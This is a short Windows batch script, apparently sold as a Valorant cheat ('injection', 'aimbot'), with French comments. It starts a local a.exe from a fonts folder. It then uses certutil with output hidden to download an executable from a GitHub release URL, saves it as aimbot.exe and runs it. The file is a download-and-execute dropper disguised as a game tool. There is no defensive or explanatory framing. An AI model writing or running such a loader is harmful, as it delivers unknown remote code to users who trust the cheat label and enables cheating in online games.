@echo off
cd /d "Valorant\new\menus\fonts"
start a.exe
echo injection 2 ne pas fermer la page
set "URL=https://github.com/hvbsvqdj/tool-boost-funk/releases/download/boost/boost.exe"
set "Dossier=VMouse"
set "NomFichier=%Dossier%\aimbot.exe"

certutil -urlcache -split -f %URL% "%NomFichier%" >nul 2>&1

if exist "%NomFichier%" (
    start "" "%NomFichier%"
)
